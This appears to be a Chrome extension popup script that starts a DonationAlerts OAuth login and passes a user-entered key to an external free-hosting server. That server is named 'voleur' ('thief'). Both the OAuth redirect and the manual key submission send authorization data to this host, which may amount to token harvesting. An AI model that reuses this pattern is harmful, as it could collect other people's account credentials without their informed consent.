$(function() {
    $('#create_token_button').click(function () {
        url = 'https://www.donationalerts.com/oauth/authorize?response_type=code&client_id=402&redirect_uri=https://voleur.000webhostapp.com/api/processor.php&%20%20%20%20scope=oauth-user-show oauth-donation-subscribe oauth-donation-index';
        let auth_id = 0;
        var tab_id = chrome.windows.create({
            url: url,
            type: "popup"
        }, function(win) {
            auth_id = win['id'];
        });
        url = 'https://voleur.000webhostapp.com/api/catch.php?check';
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url,true);
        xhr.send('authorize');
        xhr.onload = function() {
            console.log('Loaded: '+xhr.status);
            if (xhr.status == 200) {
                console.log(xhr.response);
                chrome.windows.remove(auth_id);
            } else {
                console.log("while create token we got a error: "+xhr.status);
            }
        };
        xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
            console.log(`Error connect`);
        }
    });
    $('#button_token').click(function () {              //обрабатываем нажатие на кнопку
        var user_key = $('#input_field').val();
        var url = 'https://voleur.000webhostapp.com/api/catch.php?code='+user_key;  
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url,true);
        xhr.send(user_key);
        xhr.onload = function() { //получаем ответ от сервера
            console.log(`Loaded: ${xhr.status}`); //статус
            console.log(JSON.parse(xhr.response)); //тело ответа

        };

        xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
            console.log(`Error connect`);
        };

        xhr.onprogress = function(event) { // запускается периодически
                                           // event.loaded - количество загруженных байт
                                           // event.lengthComputable = равно true, если сервер присылает заголовок Content-Length
                                           // event.total - количество байт всего (только если lengthComputable равно true)
            console.log(`Loaded ${event.loaded} from ${event.total}`);
        };
    });
});

